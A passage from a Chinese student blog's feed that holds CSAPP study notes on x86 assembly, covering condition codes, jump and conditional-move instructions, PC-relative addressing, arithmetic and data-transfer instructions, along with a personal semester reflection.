<p>对于testl %eax，%eax这个指令，或许有的猿友会比较容易蒙，想不明白它如何判断一个数到底是正是负还是零。其实这个道理是非常简单的，只是有时候会一时转不过来，当两个操作数相同时，则经过“与运算”以后还是它自身。此时系统会根据计算结果去设置条件码，而结果又是它自身，因此其实就相当于根据这个数的正负零去设置条件码，这样就可以判断出这个数的正负了。就像cmpl $0，%eax一样，在减去0之后，还是它自身，然后根据自身的正负零去设置条件码寄存器。</p>
<h3 id="访问条件码寄存器"><a href="#访问条件码寄存器" class="headerlink" title="访问条件码寄存器"></a>访问条件码寄存器</h3><p>对于普通寄存器来讲，使用的时候一般是直接读取它的值，而对于条件码寄存器来说，则不一定非要读取它的值才能使用。对于条件码寄存器来讲，有三种使用方式，都可以让它发挥作用。</p>
<ul>
<li>可以根据条件码寄存器的某个组合，将一个字节设置为0或1，其实这个就相当于读值。</li>
<li>可以直接条件跳转到程序的某个其它的部分。</li>
<li>可以有条件的传送数据。</li>
</ul>
<p>其中第一种方式涉及到<code>SET</code>指令，只用一个目的操作数，一条<code>SET</code>指令的目的操作数是8个单字节寄存器元素之一，或是存储一个字节的存储器位置，将这个字节设置成0或1。所以第一种方式其实就是普通寄存器的用法，直接读取条件码寄存器的值，然后进行使用。对于第二和第三种来说，就不是这样了，它们不会显示的读取条件码寄存器的值，而是直接使用。</p>
<h4 id="SET指令"><a href="#SET指令" class="headerlink" title="SET指令"></a>SET指令</h4><p><img src="/images/汇编-20.png" alt="SET指令"></p>
<p>对于<code>setae %al</code>指令来说，<code>%al</code>是<code>%eax</code>寄存器中的最后一个字节，这个指令的含义是，将<code>~CF</code>的值设置到<code>%eax</code>寄存器的最后一个字节。</p>
<h3 id="条件码寄存器的组合"><a href="#条件码寄存器的组合" class="headerlink" title="条件码寄存器的组合"></a>条件码寄存器的组合</h3><p>条件码寄存器的组合是执行跳转的重要判断依据，如何将条件码寄存器的组合与条件联系起来。</p>
<p>首先要说明的一点是，对于所有的组合都基于a-b这样的前提，也就是说条件码寄存器的值是经过了一个减运算设置后的值。例如，对于【e-&gt;ZF】这样的形式，代表的意思是字母e作为后缀时，则以ZF的值为1视为条件成立。</p>
<h3 id="条件跳转指令：jmp指令"><a href="#条件跳转指令：jmp指令" class="headerlink" title="条件跳转指令：jmp指令"></a>条件跳转指令：jmp指令</h3><p>这个指令是我们程序实现流程控制的关键指令，它可以直接将程序跳转到指定的位置，又或者根据条件码寄存器的组合进行条件跳转。</p>
<p><img src="/images/汇编-21.png" alt="jmp指令"></p>
<p>可以看到，除了两个jmp指令之外，其余指令均是由j与条件码的组合组成的，因此除了第一个jmp直接跳转指令以及第二个jmp间接跳转指令之外，剩下的12个都是条件跳转指令，它们基于条件码寄存器的组合进行跳转。</p>
<p>总的来说，跳转指令的地址编码一般有两种，第一种是基于PC的，第二种则是绝对地址。基于PC（程序计数器）则是指给出一个偏移量，这个偏移量基于当前下一条指令的地址，也就是PC当中的值，这是一种最常用的方式。绝对地址则比较简单，它将直接给出存储器当中代码的位置。</p>
<p>比如我们最容易理解的je指令，它代表的是“相等则跳转”。j是跳转的意思，e则是条件码的组合，代表英文equals，因为我们基于a-b去设置条件码寄存器，因此当ZF为1时，代表a等于b。因此ZF条件码寄存器就是相等的条件码组合，而je就代表相等则跳转，就像if(a==b){block}这样的代码所代表的意思。</p>
<ul>
<li><p>e-&gt;ZF（相等）：e是equals的意思。这里代表的组合是ZF，因为ZF在结果为0时设为1，即a-b=0，也就是说a==b。因此ZF代表的意义是相等。</p>
</li>
<li><p>ne-&gt;~ZF（不相等）：ne是not equals的意思。这里代表的组合是~ZF，也就是ZF做“非运算”，则很明显是不相等的意思。</p>
</li>
<li><p>s-&gt;SF（负数）：s这里没什么实际意义，因为负数的直译是negative number，首字母是n，这与not的首字母重复了，因此这里就取了SF条件码寄存器的首个字母（纯属LZ的猜测，无权威证明，不过LZ自我感觉应该八九不离十，0.0）。这里代表的组合是SF，因为SF在计算结果为负数时设为1，此时可以认为b为0，即a&lt;0。因此这里是负数的意思。</p>
</li>
<li><p>ns-&gt;~SF（非负数）：与s相反，加上n则是not的意思，因此这里代表非负数。</p>
</li>
<li><p>l-&gt;SF^OF（有符号的小于）：l代表的是less。这里的组合是SF^OF，即对SF和OF做“异或运算”。“异或运算”的意思则是代表，SF和OF不能相等。那么有两种情况，当OF为0时，则代表没有溢出，此时SF必须为1，SF为1则代表结果为负。即a-b&lt;0，也就是a&lt;b，也就是小于的意思。当OF为1时，则代表产生了溢出，而此时SF必须为0，也就是说结果最后为正数，那么此时则是负溢出，也可以得到a-b&lt;0，即a&lt;b。综合前面两种情况，SF^OF则代表小于的意思。</p>
</li>
<li><p>le-&gt;(SF^OF)|ZF（有符号的小于等于）：le是less equals的意思。有了前面小于的基础，这里就很容易理解了。SF^OF代表小于，ZF代表等于，因此两者的“或运算”则代表小于等于。</p>
</li>
<li><p>g-&gt;~(SF^OF)&amp;~ZF（有符号的大于）：g是greater的意思。这里的组合是~(SF^OF)&amp;~ZF，相对来说就比较复杂了。不过有了前面的铺垫，这个也非常好理解。SF^OF代表小于，则~(SF^OF)代表大于等于，而~ZF代表不等于，将~(SF^OF)与~ZF取“与运算”，则代表大于等于且不等于，也就是大于。</p>
</li>
<li><p>ge-&gt;~(SF^OF)（有符号的大于等于）：ge是greater equals的意思。这个组合就不需要再解释了吧。</p>
</li>
<li><p>b-&gt;CF（无符号的小于）：b是below的意思。CF是无符号溢出标志，这里的意思是指如果a-b结果溢出了，则代表a是小于b的，即a&lt;b。其实这个结论很显然，关键点就在于，无符号减法只有在减出负数的时候才可能溢出，也就是说只要结果溢出了，那么一定有a-b&lt;0。因此这个结论就显而易见了。</p>
</li>
<li><p>be-&gt;CF|ZF（无符号的小于等于）：这里是below equals的意思。因此这里会与ZF计算“或运算”，字面上也很容易理解，即CF（小于）|（或）ZF（等于），也就是小于等于。</p>
</li>
<li><p>a-&gt;~CF&amp;~ZF（无符号的大于）：a代表的是above。这个组合也是非常好理解的，CF代表小于，则~CF代表大于等于，~ZF代表不等于，因此~CF&amp;~ZF则代表大于等于且不等于，即大于。</p>
</li>
<li><p>ae-&gt;~CF（无符号的大于等于）：ae是above equals的意思。至于这个组合的意义，相信也不需要解释了吧。</p>
</li>
</ul>
<p>以上则是几乎所有的条件码寄存器组合，如果你完全理解了上面的组合，那么接下来的一系列指令会非常简单。它们只是基于条件码的组合，进行设值、跳转、传送的操作而已。从形式上来讲，上面这些组合与数据格式中的b、w、l的用法非常相似。</p>
<h4 id="基于PC的偏移量寻址"><a href="#基于PC的偏移量寻址" class="headerlink" title="基于PC的偏移量寻址"></a>基于PC的偏移量寻址</h4><p>相信大部分都听说过这样的说法，PC（程序计数器）会一直指向程序的下一条指令，因此这里所说的PC的相对位置，则是指跳转指令会附带一个偏移量，而这个偏移量与PC值的和则刚好指向跳转的位置。为了理解起来简单，这里举个简单的例子，我们考虑下面一段代码，这是一个非常简单的取两数最小值的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int min(int a,int b)&#123;</div><div class="line">    if( a &lt; b )&#123;</div><div class="line">        return a;</div><div class="line">    &#125;else&#123;</div><div class="line">        return b;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们将其命名为jmp.c，并使用-O1和-S参数去编译它，我们将会得到以下汇编代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">	.file	&quot;jmp.c&quot;</div><div class="line">	.text</div><div class="line">	.globl	min</div><div class="line">	.type	min, @function</div><div class="line">min:</div><div class="line">.LFB0:</div><div class="line">	.cfi_startproc</div><div class="line">	pushl	%ebp</div><div class="line">	.cfi_def_cfa_offset 8</div><div class="line">	.cfi_offset 5, -8</div><div class="line">	movl	%esp, %ebp</div><div class="line">	.cfi_def_cfa_register 5</div><div class="line">	movl	8(%ebp), %eax</div><div class="line">	cmpl	12(%ebp), %eax</div><div class="line">	jge	.L2</div><div class="line">	movl	8(%ebp), %eax   </div><div class="line">	jmp	.L3</div><div class="line">.L2:</div><div class="line">	movl	12(%ebp), %eax</div><div class="line">.L3:</div><div class="line">	popl	%ebp</div><div class="line">	.cfi_restore 5</div><div class="line">	.cfi_def_cfa 4, 4</div><div class="line">	ret</div><div class="line">	.cfi_endproc</div><div class="line">.LFE0:</div><div class="line">	.size	min, .-min</div><div class="line">	.ident	&quot;GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4&quot;</div><div class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure>
<p>经过前面的学习，不难看懂上面的汇编代码。其中a和b分别存储在栈顶+8和+12的位置，<code>cmpl    12(%ebp), %eax</code>比较 <code>a-b</code>的结果，如果<code>a&gt;=b</code>，就跳转到 .L2,执行<code>movl    12(%ebp), %eax</code>把b的值放到寄存器<code>%eax</code>中，作为函数返回值；如果<code>a&lt;b</code>则不跳转，执行<code>movl    8(%ebp), %eax</code>把a的值放到寄存器<code>%eax</code>中，作为函数返回值,然后<code>jmp</code>无条件跳转到 .L3 。可以看到，在汇编代码当中，<code>jmp族指令</code>会使用标签指示跳转地址，比如上面出现过的<code>.L2</code>、<code>.L3</code>。</p>
<p>不过经过汇编器处理之后，标签将不会再存在，此时会使用上面所说的PC偏移量记录跳转地址。接下来，我们看一下这个<code>偏移量寻址</code>的方式。我们可以使用-O1和-c编译jmp.c，并使用objdump加-d参数去查看jmp.o，这样会得到下面的反汇编代码。</p>
<p><img src="../images/汇编-22.png" alt="反汇编代码"></p>
<p>可以看到，这里面的指令序列与刚才的一模一样，因为我们采取了同样的优化等级-O1。值得注意的是，在第<code>0x9</code>行的指令<code>jge    10 &lt;min+0x10&gt;</code>中，跳转的偏移地址是<code>0x10</code>，也就是<code>mov    0xc(%ebp),%eax</code>,其实这个地址是通过偏移量计算出来的。作为暖男的我，已经在图上圈出来了，在指令的<code>jge    10</code>二进制序列<code>7d 05</code>中,<code>7d</code>指的是指令<code>jge</code>,<code>05</code>指的是操作数，此时的<code>pc</code>值是<code>0xb</code>。请切记<strong>PC（程序计数器）会一直指向程序的下一条指令</strong>，所以指令<code>jge</code>的跳转地址为<code>0x05+0xb = 0x10</code>,正是指令<code>mov    0xc(%ebp),%eax</code>。</p>
<p>为了证明这一点，我们可以使用hexdump加-C参数查看jmp.o。</p>
<p><img src="/images/汇编-23.png" alt="hexdump查看"></p>
<p>这下比较清楚了吧，当碰到<code>7d</code>指令（即jle）时，会检查后面的偏移量，结果一看是<code>0x05</code>，于是在条件满足的前提下，会跳过5个字节执行接下来的指令，也就是<code>8b 45 0c</code>（即mov指令）。</p>
<h3 id="条件传送指令：cmov指令"><a href="#条件传送指令：cmov指令" class="headerlink" title="条件传送指令：cmov指令"></a>条件传送指令：cmov指令</h3><p>接下来我们来看最后一种条件指令，叫做条件传送指令。顾名思义，条件传送指令的意思就是在满足条件的时候进行传送的指令，也就是cmov指令。它与set指令十分相似，同样有12种，也就是加上12种条件码寄存器的组合即可，以下是一张书中的指令表格。</p>
<p><img src="/images/汇编-24.png" alt="cmov指令"></p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer18.html" target="_blank" rel="external">深入理解计算机系统（3.6）—汇编中精妙的流程控制（重要）（难度较高）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;本章我们来看一个特别有趣的内容，就是汇编级别的语言，如何利用寄存器实现if/for/while这些高级语言的流程控制，我相信你能感受到它的神
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-3</title>
    <link href="http://yoursite.com/2018/05/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-3/"/>
    <id>http://yoursite.com/2018/05/07/深入理解计算机系统-汇编的世界-3/</id>
    <published>2018-05-06T20:43:50.000Z</published>
    <updated>2018-05-06T14:10:08.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="算术与逻辑运算指令"><a href="#算术与逻辑运算指令" class="headerlink" title="算术与逻辑运算指令"></a>算术与逻辑运算指令</h3><p>算术与逻辑运算包括很多种，估计各位猿友也能很快的想出来，比如最常见的加减乘除、与或非、左移右移等等。不过还有一个很神奇的指令 <code>leal</code>。</p>
<p><img src="/images/汇编-13.png" alt="算术与逻辑运算指令"></p>
<h3 id="leal指令"><a href="#leal指令" class="headerlink" title="leal指令"></a>leal指令</h3><p>leal指令是非常神奇的一个指令，它可以取一个存储器操作数的地址，并且将其赋给目的操作数。如果用C语言当中来对应的话，它就相当于&amp;运算。</p>
<p>比如对于<code>leal 4(%edx,%edx,4),%eax</code>这条指令来讲，我们假设<code>%edx</code>寄存器的值为x的话，那么这条指令的作用就是将<code>4 + x + 4x = 5x + 4</code>赋给<code>%eax</code>寄存器。它和<code>mov指令</code>的区别就在于，假设是<code>movl 4(%edx,%edx,4),%eax</code>这个指令，它的作用是将内存地址为<code>5x+4</code>的内存区域的值赋给<code>%eax</code>寄存器，而<code>leal指令</code>只是将5x+4这个地址赋给目的操<code>作数%eax</code>而已，它并不对存储器进行引用的值的计算。</p>
<p><img src="/images/汇编-14.png" alt="leal指令"></p>
<p>可以看到，此时在存储器中，地址为5x+4的区域的值为1000。那么此时若是进行movl 4(%edx,%edx,4),%eax操作，很显然，%eax的值应该为1000，也就是下图。</p>
<p><img src="/images/汇编-15.png" alt="leal指令"></p>
<p>但是如果进行leal 4(%edx,%edx,4),%eax操作的话，%eax的值就不是1000了，因为leal指令不会去取存储器当中的值，因此寄存器%eax的值应该是5x+4。</p>
<p><img src="/images/汇编-16.png" alt="leal指令"></p>
<p>试想一下，倘若在地址为5x+4的位置存储的是变量i，那么其实这条指令就相当于&amp;i操作，这也就是C语言当中的&amp;取地址操作的汇编级做法。</p>
<h3 id="特殊的算术操作指令"><a href="#特殊的算术操作指令" class="headerlink" title="特殊的算术操作指令"></a>特殊的算术操作指令</h3><p>不难发现这张图的指令跟上面的指令有点类似，不过下面的指令有点特殊：<strong>这些指令可以让只有32位的寄存器存储64位的数据</strong>。</p>
<p><img src="/images/汇编-17.png" alt="特殊的算术操作指令"></p>
<h3 id="imull、mull指令"><a href="#imull、mull指令" class="headerlink" title="imull、mull指令"></a>imull、mull指令</h3><p>这两个指令一看就是双胞胎，它们一个负责有符号全64位乘法，一个负责无符号全64位乘法。不难发现，imull这个指令好像是负责乘法的指令，而且在之前的乘法并没有区分有符号和无符号，现在怎么又成双胞胎指令了。</p>
<p>上张图中出现的指令是<code>IMUL指令</code>，当它操作双字的时候，也就是<code>imull指令</code>。不过不同的是，它的一般形式是<code>imull S D</code>，这里有两个操作数，它将计算S和D的乘积并截断为双字，然后存储在D当中。由于在截断时，无符号以及有符号的二进制序列是一样的，因此此处的乘法指令并不区分有符号和无符号。</p>
<p>现在我们讨论的<code>imull指令</code>，则与上面的普通乘法指令稍有不同，它只有一个操作数，也就是说，它的一般形式为<code>imull S</code>，这点在图片中也能看出来，而另外一个操作数默认为<code>%eax寄存器</code>。最终的结果，会将高32位存入%edx寄存器，而低32位存入%eax寄存器。</p>
<p>试想一下，如果我们只取%eax寄存器当中的32位结果，那其实这里计算的结果就是S*%eax，此时<code>imull S</code>的作用就与<code>imul S D</code>是一样的，只是目的操作数被固定为%eax罢了。</p>
<p>接下来我们看一个简单的示例，我们去看下指令<code>imull $0x3</code>的结果，我们假设此时<code>%eax</code>寄存器的值为<code>0x82345600</code>。也就是我们需要计算<code>0x3*0x82345600</code>的值，十六进制结果为<code>0xFFFF FFFE 869D 0200</code>。这个结果为64位的，因此我们寄存器的前后状态如下所示。</p>
<p><img src="/images/汇编-18.png" alt="imull指令"></p>
<p>可以看到，%eax保存着低32位的结果，单说这32位的话，它的有符号数值为-2036530688，正是我们直接计算0x3*0x82345600的32位截断后的有符号值，显然这个结果溢出了。如果组合上高32位，则结果为-6331497984，将它加上或者取模4294967296（2的32次方）将得到我们32位的结果。这里的有符号乘法采取的是先符号扩展被乘数，然后两者相乘，将结果再截断为64位所得。</p>
<p>对于mull的单操作数指令来讲，就比较简单了，它采用的是无符号乘法，因此就和我们平时的十进制乘法运算类似，只是同样的，它也会将结果的高32位存入%edx，将低32位存入%eax。</p>
<h3 id="cltd指令"><a href="#cltd指令" class="headerlink" title="cltd指令"></a>cltd指令</h3><p>这个指令相对来说就非常简单了，它就是简单的将%eax寄存器的值符号扩展32位到%edx寄存器，也就是说，如果%eax寄存器的二进制序列的最高位为0，则cltd指令将把%edx置为32个0，相反，如果%eax寄存器的二进制序列最高位为1，则cltd指令将会自从填充%edx寄存器为32个1。</p>
<h3 id="idivl、divl指令"><a href="#idivl、divl指令" class="headerlink" title="idivl、divl指令"></a>idivl、divl指令</h3><p>这两个指令与前面的imull以及mull类似，它也将计算结果存放在两个寄存器当中，其中余数存放在%edx寄存器，商存放在%eax寄存器。如果各位理解了前面的imull以及mull，那么这里idivl和divl理解起来会非常简单。</p>
<p>这里举一个简单的例子，考虑指令<code>idivl $0x3</code>的结果，我们假设此时%eax寄存器的值为<code>0x82345600</code>。也就是我们需要计算0x82345600/0x3的值，商为0xD6117200，余数为0x0。因此我们寄存器的前后状态如下所示。</p>
<p><img src="/images/汇编-19.png" alt="idivl指令"></p>
<p>可以看到，在idivl这个指令执行的过程中，其实对被除数进行了符号扩展，类似于cltd指令，或者有时也会将%eax移动到%edx，然后对%edx进行算术右移31位的运算。这两种方式的结果是一样的，都是将%eax符号扩展32位并存储在%edx当中。</p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer16.html" target="_blank" rel="external">深入理解计算机系统（3.4）—算数与逻辑运算指令详解</a><br><a href="http://www.cnblogs.com/zuoxiaolong/p/computer17.html" target="_blank" rel="external">深入理解计算机系统（3.5）—特殊的算术操作指令详解</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;算术与逻辑运算指令&quot;&gt;&lt;a href=&quot;#算术与逻辑运算指令&quot; class=&quot;headerlink&quot; title=&quot;算术与逻辑运算指令&quot;&gt;&lt;/a&gt;算术与逻辑运算指令&lt;/h3&gt;&lt;p&gt;算术与逻辑运算包括很多种，估计各位猿友也能很快的想出来，比如最常见的加减乘除、与或非
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>总结|我的大二下</title>
    <link href="http://yoursite.com/2018/05/07/%E6%80%BB%E7%BB%93-%E6%88%91%E7%9A%84%E5%A4%A7%E4%BA%8C%E4%B8%8B/"/>
    <id>http://yoursite.com/2018/05/07/总结-我的大二下/</id>
    <published>2018-05-06T19:39:25.000Z</published>
    <updated>2018-05-18T16:49:40.677Z</updated>
    
    <content type="html"><![CDATA[<p><code>May 6, 2018 7:54 PM</code></p>
<h3 id="我的计划"><a href="#我的计划" class="headerlink" title="我的计划"></a>我的计划</h3><p>在寒假的时候，自己有看了吴恩达教授的机器学习的基础课程，了解了一些基本的概念，比如说<code>线性回归</code>、<code>梯度下降</code>等等。同时，自己从大一开始就在弄一些Web相关的，接触的都是一些应用的东西，想到是做项目、找实习，但自己冷静下来想想，自己还是没有一些核心竞争力，自己所学的这些别人花几个月就能搞定，所以自己就想着学习一些<code>高大尚</code>的东西，就想着入坑机器学习了。</p>
<p>所以，自己就想着大二下能搞一下机器学习的东西，自己书都买好啦，周志华的西瓜书和机器学习实战，但…</p>
<h3 id="改变计划"><a href="#改变计划" class="headerlink" title="改变计划"></a>改变计划</h3><p>新学期开始的时候，学校开的课是<code>操作系统</code>、<code>深入理解计算机雄</code>、<code>计算机算法</code>，自己刚开始以为在搞定学校开的课的同时还能研究机器学习得东西，还是高估了自己呀。学了一段时间才发现，这三门课并不简单，也是需要深入理解才能发现其奥秘的。</p>
<h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>书上讲的都是概念性的东西，听课后的感觉是懵懂懵懂的，自己也意识到了操作系统的重要性，就上网找了一些公开课，淘到了哈工大李治军老师讲的公开课，结合代码原理一起讲，挺透彻的；还有就是<code>mit6.828</code>这个公开课。另外，操作系统这个东西，还是需要做一些实验，去改操作系统的源码，比如说加个系统调用…</p>
<p>总之一句话，值得下功夫。</p>
<h4 id="深入理解计算机系统"><a href="#深入理解计算机系统" class="headerlink" title="深入理解计算机系统"></a><a href="http://csapp.cs.cmu.edu/" target="_blank" rel="external">深入理解计算机系统</a></h4><p>这门课讲的是更底层面的东西，深入CPU、寄存器，研究汇编代码，看我们的代码是如何被解释运行的，说白了，就是进入了二进制的世界，去探寻二进制简单又不简单的奥秘。自己感觉这门课学校讲的是可以的，老师也挺不错的。自己刚开始不是很重视这个课，不是很认真对待，不过后来发现这些东西挺有意思的：用gdb调试，看寄存器的值，通过汇编代码还原出源代码，用简单的位运算在字节的层面处理数据…挺有意思的。要深入理解，是要沉下心来慢慢研究的。</p>
<p>总之一句话，值得下功夫。</p>
<h4 id="计算机算法"><a href="#计算机算法" class="headerlink" title="计算机算法"></a>计算机算法</h4><p>说到算法，自己有点惭愧。之前，自己没有花一点心思在算法上面，所以参加的笔试都是以失败告终。自己也买了许多算法的书，也看了，但是就是不能抓住一些算法的奥秘，不知为何。现在知道答案了：因为自己没有运用，说白了，就是没刷题。算法就好像数学里的公式，你不去做题运用，是不可能深刻理解的。也正以此，自己现在都在刷LeetCode的题目，也做记录，不是很怕笔试了。</p>
<p>总之一句话，值得下功夫。</p>
<p>这三门课都是挺重要的，都是需要不少时间和精力的，同时，人的精力是有限的，所以只能改变计划，重点研究这些东西，机器学习什么的，日后吧。</p>
<h3 id="其他的小改变"><a href="#其他的小改变" class="headerlink" title="其他的小改变"></a>其他的小改变</h3><p>这学期，自己并不是把所有的时间放在的code上面了，生活中不在只有代码了。</p>
<p>自己无意中看到了<code>每天五分钟VOA英语随声听</code>的小本本，每一篇新闻都挺简短的，听一次录音也只需要两分钟，有快速慢速的，自己时不常就听一篇，挺好。自己还看了一些课外书啊，经济方面的<code>激荡3o年</code>,<code>博弈论</code>…同时，也懂得享受生活了，时常听歌，晚上不下雨就去打球，挺好。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;May 6, 2018 7:54 PM&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;我的计划&quot;&gt;&lt;a href=&quot;#我的计划&quot; class=&quot;headerlink&quot; title=&quot;我的计划&quot;&gt;&lt;/a&gt;我的计划&lt;/h3&gt;&lt;p&gt;在寒假的时候，自己有看了吴恩达教授的机器学习
    
    </summary>
    
      <category term="college" scheme="http://yoursite.com/categories/college/"/>
    
    
      <category term="college" scheme="http://yoursite.com/tags/college/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-2</title>
    <link href="http://yoursite.com/2018/05/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-2/"/>
    <id>http://yoursite.com/2018/05/06/深入理解计算机系统-汇编的世界-2/</id>
    <published>2018-05-05T20:47:06.000Z</published>
    <updated>2018-05-05T13:13:58.093Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>据传送指令的目的是为了将一个数据从一个位置复制到另外一个位置。既然如此，那么数据传送指令就会包含一个源操作数和一个目的操作数，指令会将原操作数的值复制到目的操作数并覆盖。</p>
<p>数据传送指令一共可分为五种，分别是<code>mov</code>、<code>movs</code>、<code>movz</code>、<code>push</code>以及<code>pop</code>。</p>
<h3 id="mov指令"><a href="#mov指令" class="headerlink" title="mov指令"></a>mov指令</h3><p>mov指令的作用是将源操作数S中的数据复制到目的操作数D中，mov指令有一个数据格式和两个操作数，因此一般的形式为[movx S D]。其中x为数据格式，S为源操作数，D为目的操作数。</p>
<p>这里举一个简单的例子，比如我们有一条指令为<code>movl %edx %eax</code>。那么它的执行过程就如下图所示。</p>
<p><img src="/images/汇编-06.png" alt="mov指令"></p>
<p>可以看到，在指令执行之后，%edx寄存器当中的内容会被复制到%eax寄存器。需要一提的是，mov指令可以在后面加上任何数据格式，比如上面这一过程中，数据格式则为四个字节，也就是双字。因此不难推断出，我们还可以使用movb和movw去复制一个字节或者两个字节。</p>
<h3 id="movs指令"><a href="#movs指令" class="headerlink" title="movs指令"></a>movs指令</h3><p>movs指令的作用是将源操作数S中的数据做符号扩展后，再复制到目的操作数D中，movs指令有两个数据格式和两个操作数，因此一般的形式为[movsxy S D]。其中x、y为数据格式，S为源操作数，D为目的操作数。其中x、y的组合一共有三种，分别是bw、bl、wl，这三个组合代表的意思分别是单字节到双字节，单字节到双字以及双字节到双字。</p>
<p>对于指令<code>movswl %dx %eax</code>来讲，它的作用如下图所示。</p>
<p><img src="/images/汇编-07.png" alt="movs指令"></p>
<p>这里为了可以看出符号位的扩展，因此LZ这里使用了十六进制的整数表示方式。可以看到，movs指令将0x8FFF扩展以后存入%eax寄存器，其中%dx为寄存器%edx的后16位表示。</p>
<h3 id="movz指令"><a href="#movz指令" class="headerlink" title="movz指令"></a>movz指令</h3><p>movz指令的作用是将源操作数S做零扩展后，再复制到目的操作数中。它与movs指令十分相似，也有两个数据格式和两个操作数，因此一般的形式为[movzxy S D]。其中x、y为数据格式，S为源操作数，D为目的操作数。其中x、y的组合一共有三种，分别是bw、bl、wl，这三个组合代表的意思分别是单字节到双字节，单字节到双字以及双字节到双字。</p>
<p>这里依然采用相似的示例，我们来看看对于指令<code>movzwl %dx %eax</code>来讲，它的作用与上面的movs有何不同。</p>
<p><img src="/images/汇编-08.png" alt="movz指令"></p>
<p>可以看出，movz与movs指令是十分相似的，只是这里扩展后，目标寄存器%eax的前16位为0而不再是1。</p>
<h3 id="push指令"><a href="#push指令" class="headerlink" title="push指令"></a>push指令</h3><p>push指令与上面的mov族指令有着不同，它的目的操作数被固定为栈顶，因此它的指令当中没有目的操作数。另外有一点需要注意的是，它在进行复制操作之前，需要移动栈顶指针（-4）。push指令的一般形式为[pushl S]，其中l代表数据格式为双字，S为源操作数，目的操作数默认为栈顶。</p>
<p>这里举一个简单的例子，比如<code>pushl %edx</code>这条命令，它的任务是将%edx寄存器的值复制到栈顶。我们首先来看一下命令执行前，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-09.png" alt="push指令"></p>
<p>可以看到，寄存器%ebp和%esp分别指向帧指针和栈指针，而%esp实际上就是指向的栈顶。由于现在栈顶位于-16的位置，因此若要将%edx压入栈，则先需要将栈顶移动到-20的位置，然后再进行复制，移动后的状态如下图所示。</p>
<p><img src="/images/汇编-10.png" alt="push指令"></p>
<p>可以看到，这里栈指针的位置已经发生了变化，向下移动了四位，并且将%edx寄存器的值放入新的栈顶，因此pushl %edx指令就相当于下面两条指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">subl $4,%esp</div><div class="line">movl %edx,(%esp)</div></pre></td></tr></table></figure></p>
<p>###pop指令</p>
<p>pop指令与push指令是做的相反的操作，一个是入栈一个是出栈。对于pop指令来讲，它的源操作数被固定为栈顶，相反，它会先进行复制操作，然后再移动栈指针。pop指令的一般形式为[popl D]，其中l代表数据格式为双字，D为目的操作数，源操作数默认为栈顶。</p>
<p>接下来我们举一个例子，与上面的例子类似，我们考虑<code>popl %edx</code>这条指令的效果，它会将栈顶的值弹出到寄存器%edx。首先来看执行之前，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-11.png" alt="ppo指令"></p>
<p>接下来执行pop指令时，会先将栈顶的值复制到%edx，然后再将栈指针移动（+4）。我们来看一下它执行后的状态。</p>
<p><img src="/images/汇编-12.png" alt="ppo指令"></p>
